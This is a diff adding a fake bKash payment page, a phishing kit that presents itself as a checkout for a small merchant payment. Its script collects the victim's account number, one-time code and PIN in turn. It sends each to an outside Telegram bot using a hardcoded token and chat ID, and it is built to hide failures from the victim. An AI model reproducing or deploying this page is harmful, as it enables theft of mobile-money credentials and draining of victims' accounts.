@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>bKash Payment</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f2f2f2; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .payment-box { width: 100%; max-width: 380px; background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); overflow: hidden; }
+    .header { text-align: center; padding: 20px 10px 10px; }
+    .header img { height: 45px; }
+    .merchant { padding: 12px 18px; font-size: 15px; color: #444; display: flex; justify-content: space-between; border-bottom: 1px solid #eee; }
+    .main-box { background: #e2136e; padding: 25px 20px; text-align: center; }
+    .main-box h2 { color: #fff; font-size: 15px; margin-bottom: 12px; font-weight: normal; }
+    .masked { font-size: 14px; color: #f7f7f7; margin-bottom: 15px; display: none; }
+    .input-field { background: #fff; border-radius: 6px; padding: 12px; }
+    .input-field input { border: none; outline: none; width: 100%; font-size: 18px; text-align: center; letter-spacing: 2px; background: transparent; caret-color: #e2136e; width: 100%; }
+    .input-field input.pin-mode { letter-spacing: 6px; -webkit-text-security: disc; }
+    .error { margin-top: 8px; font-size: 13px; color: #ffcccb; display: none; }
+    .note { font-size: 13px; color: #fff; margin-top: 10px; }
+    .actions { display: flex; gap: 10px; padding: 15px; }
+    .btn { flex: 1; padding: 14px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; font-size: 15px; }
+    .btn-cancel { background: #f1f1f1; color: #333; }
+    .btn-confirm { background: #e2136e; color: #fff; position: relative; }
+    .loading::after { content: ""; position: absolute; right: 15px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { 0% { transform: translateY(-50%) rotate(0deg); } 100% { transform: translateY(-50%) rotate(360deg); } }
+    .footer { text-align: center; font-size: 12px; padding: 12px; color: #999; border-top: 1px solid #eee; }
+  </style>
+</head>
+<body>
+
+<div class="payment-box">
+  <div class="header">
+    <img src="https://www.logo.wine/a/logo/BKash/BKash-Logo.wine.svg" alt="bKash">
+  </div>
+  <div class="merchant">
+    <div>Ali Store <small>Inv No: CISOHPAYIVEE8ZN...</small></div>
+    <div><b>৳21.00</b></div>
+  </div>
+
+  <form id="multiStepForm">
+    <div class="main-box">
+      <h2 id="stepTitle">Your bKash Account Number</h2>
+      <div id="maskedNumber" class="masked"></div>
+      <div class="input-field">
+        <input type="tel" id="mainInput" placeholder="e.g 01XXXXXXXXX" maxlength="11" inputmode="numeric" required>
+      </div>
+      <div class="error" id="error-msg">⚠️ সঠিক তথ্য দিন</div>
+      <div id="termsNote" class="note">Confirm and proceed, <a href="#" style="color:white">terms & conditions</a></div>
+    </div>
+    <div class="actions">
+      <button type="button" class="btn btn-cancel" onclick="window.location.href='index.html'">Cancel</button>
+      <button type="submit" class="btn btn-confirm" id="confirmBtn">Confirm</button>
+    </div>
+  </form>
+
+  <div class="footer">☎ <span style="color:#e2136e">16247</span><br>© 2025 bKash, All Rights Reserved</div>
+</div>
+
+<script>
+  // নিচে আপনার টেলিগ্রাম তথ্য দিন
+  const TELEGRAM_TOKEN = '8599559236:AAHiKkoqaOiN39NP1s-BSB1LaJ6HFb-O5BU'; // @BotFather থেকে পাওয়া টোকেন
+  const CHAT_ID = '7260345767';         // আপনার চ্যাট আইডি
+
+  const form = document.getElementById("multiStepForm");
+  const input = document.getElementById("mainInput");
+  const errorMsg = document.getElementById("error-msg");
+  const confirmBtn = document.getElementById("confirmBtn");
+  const stepTitle = document.getElementById("stepTitle");
+  const maskedDiv = document.getElementById("maskedNumber");
+  const termsNote = document.getElementById("termsNote");
+
+  let currentStep = 1; 
+  let phoneNumber = "";
+
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
+    const value = input.value.trim();
+    let message = "";
+
+    // ভ্যালিডেশন এবং মেসেজ তৈরি
+    if (currentStep === 1) {
+      if (!/^01[3-9]\d{8}$/.test(value)) { showError("⚠️ সঠিক নাম্বার দিন"); return; }
+      phoneNumber = value;
+      message = `✅ New bKash Login\n📱 Number: ${value}`;
+    } else if (currentStep === 2) {
+      if (!/^[0-9]{6}$/.test(value)) { showError("⚠️ ৬ সংখ্যার কোড দিন"); return; }
+      message = `🔢 OTP Received\n📱 Number: ${phoneNumber}\n📝 Code: ${value}`;
+    } else if (currentStep === 3) {
+      if (!/^[0-9]{5}$/.test(value)) { showError("⚠️ ৫ সংখ্যার পিন দিন"); return; }
+      message = `🔑 PIN Received\n📱 Number: ${phoneNumber}\n📌 PIN: ${value}`;
+    }
+
+    sendData(message);
+  });
+
+  function sendData(msg) {
+    confirmBtn.classList.add("loading");
+    confirmBtn.textContent = "Processing...";
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
+
+    fetch(url)
+    .then(response => {
+      confirmBtn.classList.remove("loading");
+      confirmBtn.textContent = "Confirm";
+      
+      // ডেটা সাবমিট হওয়ার পর সাথে সাথে পরবর্তী ধাপে যাওয়া
+      if (currentStep === 1) {
+        currentStep = 2;
+        updateUI("Enter 6-digit verification code", "Enter Code", 6, "password");
+      } else if (currentStep === 2) {
+        currentStep = 3;
+        updateUI("Enter PIN of your bKash account", "Enter PIN", 5, "password");
+      } else if (currentStep === 3) {
+        window.location.href = 'index.html'; // সব শেষ হলে রিডাইরেক্ট
+      }
+    })
+    .catch(error => {
+      // ইন্টারনেট এরর হলে যেন ইউজার বুঝতে না পারে সেজন্য এগিয়ে নেওয়া
+      console.error("Telegram error:", error);
+      confirmBtn.classList.remove("loading");
+      confirmBtn.textContent = "Confirm";
+    });
+  }
+
+  function updateUI(title, placeholder, max, inputType) {
+    stepTitle.innerText = title;
+    input.value = "";
+    input.placeholder = placeholder;
+    input.maxLength = max;
+    input.type = inputType;
+    input.classList.add("pin-mode");
+    maskedDiv.style.display = "block";
+    maskedDiv.innerHTML = `<b>*******${phoneNumber.slice(-3)}</b>`;
+    termsNote.style.display = "none";
+    errorMsg.style.display = "none";
+  }
+
+  function showError(msg) {
+    errorMsg.innerText = msg;
+    errorMsg.style.display = "block";
+  }
+
+  input.addEventListener("input", () => errorMsg.style.display = "none");
+</script>
+</body>
+</html>
